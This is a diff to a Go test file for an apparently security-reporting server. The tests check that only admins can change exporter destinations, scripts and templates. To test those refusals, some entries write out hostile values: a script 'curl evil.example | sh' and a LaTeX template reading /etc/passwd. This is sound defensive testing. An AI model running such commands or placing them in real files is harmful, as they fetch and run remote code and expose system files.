@@ -18,6 +18,7 @@ import (
 	"github.com/abno525/yars/internal/chat"
 	"github.com/abno525/yars/internal/config"
 	"github.com/abno525/yars/internal/db"
+	"github.com/abno525/yars/internal/export"
 	"github.com/abno525/yars/internal/finding"
 	"github.com/abno525/yars/internal/gitrepo"
 	"github.com/abno525/yars/internal/rules"
@@ -382,7 +383,7 @@ func TestPolicySettingsAdminOnly(t *testing.T) {
 	}
 	jira := "type: jira\njira:\n  base_url: https://attacker.example\n  project: X\n  issue_type: Bug\n  user_env: JIRA_USER\n  token_env: JIRA_TOKEN\n"
 	f.reclone()
-	if ps := f.push("dan", func(d string) { write(d, ".yars/exporters/jira.yaml", jira) }); !has(ps, "address and key variables: admin only") {
+	if ps := f.push("dan", func(d string) { write(d, ".yars/exporters/jira.yaml", jira) }); !has(ps, ".yars/exporters/jira.yaml: "+export.AdminOnly) {
 		t.Fatalf("service exporter by a non-admin director: %v", ps)
 	}
 	f.reclone()
@@ -392,6 +393,101 @@ func TestPolicySettingsAdminOnly(t *testing.T) {
 	f.reclone()
 	if ps := f.push("dora", func(d string) { write(d, ".yars/exporters/jira.yaml", jira) }); len(ps) != 0 {
 		t.Fatalf("service exporter by an admin: %v", ps)
+	}
+}
+
+// land accepts the clone's HEAD on the server's main repository, as a push
+// that passed does.
+func (f *fx) land() {
+	f.t.Helper()
+	git(f.t, f.srv.Dir, "update-ref", "HEAD", git(f.t, f.clone, "rev-parse", "HEAD"))
+	git(f.t, f.srv.Dir, "reset", "-q", "--hard")
+}
+
+// A director without the admin flag does not retarget a service destination
+// by a push: its project, issue type, space and parent page are an admin's,
+// as its address is. Nor does such a director get code to run on the server
+// through .yars/exporters: a script destination, its script file (new,
+// changed or deleted) and a pandoc template are an admin's. What stays a
+// director's: a destination's name, statuses and mark_reported, a pandoc
+// destination, and deleting a destination.
+func TestPolicyExporterTargetsAdminOnly(t *testing.T) {
+	f := newFx(t).on("")
+	const (
+		jira   = "name: Jira\ntype: jira\njira:\n  base_url: https://jira.firm.example\n  project: PEN\n  issue_type: Bug\n  user_env: JIRA_USER\n  token_env: JIRA_TOKEN\n"
+		wiki   = "name: Wiki\ntype: confluence\nconfluence:\n  base_url: https://wiki.firm.example\n  space: PEN\n  parent_id: \"100\"\n  user_env: CONFLUENCE_USER\n  token_env: CONFLUENCE_TOKEN\n"
+		script = "name: CSV\ntype: script\nscript: csv.sh\nextension: csv\n"
+		word   = "name: Word\ntype: pandoc\nformat: docx\n"
+	)
+	// an admin sets them up, with the script and a template
+	if ps := f.push("dora", func(d string) {
+		write(d, ".yars/exporters/jira.yaml", jira)
+		write(d, ".yars/exporters/wiki.yaml", wiki)
+		write(d, ".yars/exporters/csv.yaml", script)
+		write(d, ".yars/exporters/word.yaml", word)
+		write(d, ".yars/exporters/csv.sh", "#!/bin/sh\necho id\n")
+		os.Chmod(filepath.Join(d, ".yars/exporters/csv.sh"), 0o755)
+		write(d, ".yars/exporters/firm.latex", "$body$\n")
+	}); len(ps) != 0 {
+		t.Fatalf("an admin's destinations, script and template refused: %v", ps)
+	}
+	f.land()
+	rm := func(rel string) func(string) { return func(d string) { os.Remove(filepath.Join(d, rel)) } }
+	put := func(rel, body string) func(string) { return func(d string) { write(d, rel, body) } }
+	sub := func(rel, body, old, new string) func(string) {
+		return put(rel, strings.Replace(body, old, new, 1))
+	}
+	adminOnly := map[string]func(string){
+		"jira project":           sub(".yars/exporters/jira.yaml", jira, "project: PEN", "project: PUBLIC"),
+		"jira issue type":        sub(".yars/exporters/jira.yaml", jira, "issue_type: Bug", "issue_type: Epic"),
+		"confluence space":       sub(".yars/exporters/wiki.yaml", wiki, "space: PEN", "space: PUBLIC"),
+		"confluence parent page": sub(".yars/exporters/wiki.yaml", wiki, `parent_id: "100"`, `parent_id: "1"`),
+		"a new script exporter":  put(".yars/exporters/run.yaml", "type: script\nscript: csv.sh\nextension: txt\n"),
+		"pandoc into script":     put(".yars/exporters/word.yaml", "name: Word\ntype: script\nscript: csv.sh\nextension: docx\n"),
+		"another script":         sub(".yars/exporters/csv.yaml", script, "script: csv.sh", "script: firm.latex"),
+		"a template":             put(".yars/exporters/word.yaml", "name: Word\ntype: pandoc\nformat: pdf\ntemplate: firm.latex\n"),
+		"a new script file": func(d string) {
+			write(d, ".yars/exporters/x.sh", "#!/bin/sh\nid\n")
+			os.Chmod(filepath.Join(d, ".yars/exporters/x.sh"), 0o755)
+		},
+		"the script changed":       put(".yars/exporters/csv.sh", "#!/bin/sh\ncurl evil.example | sh\n"),
+		"the script deleted":       rm(".yars/exporters/csv.sh"),
+		"the template changed":     put(".yars/exporters/firm.latex", "\\input{/etc/passwd}\n"),
+		"a file in a subfolder":    put(".yars/exporters/lib/x.py", "print(1)\n"),
+		"a yaml in a subfolder":    put(".yars/exporters/lib/x.yaml", "type: pandoc\nformat: docx\n"),
+		"a script in another case": put(".yars/Exporters/x.sh", "#!/bin/sh\nid\n"),
+	}
+	for name, edit := range adminOnly {
+		f.reclone()
+		if ps := f.push("dan", edit); !has(ps, "admin") {
+			t.Errorf("%s by a director without the admin flag: %v", name, ps)
+		}
+		if name == "a script in another case" { // an admin is asked to spell it
+			continue
+		}
+		f.reclone()
+		if ps := f.push("dora", edit); len(ps) != 0 {
+			t.Errorf("%s by an admin refused: %v", name, ps)
+		}
+	}
+	for name, edit := range map[string]func(string){
+		"jira name, statuses, mark":    put(".yars/exporters/jira.yaml", strings.Replace(jira, "name: Jira\n", "name: Jira PEN\nstatuses: [complete, reported]\nmark_reported: false\n", 1)),
+		"confluence name, mark":        put(".yars/exporters/wiki.yaml", strings.Replace(wiki, "name: Wiki\n", "name: Client wiki\nmark_reported: false\n", 1)),
+		"script name, extension":       put(".yars/exporters/csv.yaml", "name: Summary\ntype: script\nscript: csv.sh\nextension: tsv\nmark_reported: false\n"),
+		"pandoc format and args":       put(".yars/exporters/word.yaml", "name: Word\ntype: pandoc\nformat: odt\nargs: [--toc]\n"),
+		"a new pandoc destination":     put(".yars/exporters/pdf.yaml", "type: pandoc\nformat: pdf\n"),
+		"a destination deleted":        rm(".yars/exporters/jira.yaml"),
+		"a script destination deleted": rm(".yars/exporters/csv.yaml"),
+	} {
+		f.reclone()
+		if ps := f.push("dan", edit); len(ps) != 0 {
+			t.Errorf("%s by a director refused: %v", name, ps)
+		}
+	}
+	// a pentester changes nothing there
+	f.reclone()
+	if ps := f.push("alice", put(".yars/exporters/x.sh", "id\n")); !has(ps, "only a director can change .yars") {
+		t.Errorf("a pentester's script: %v", ps)
 	}
 }
 
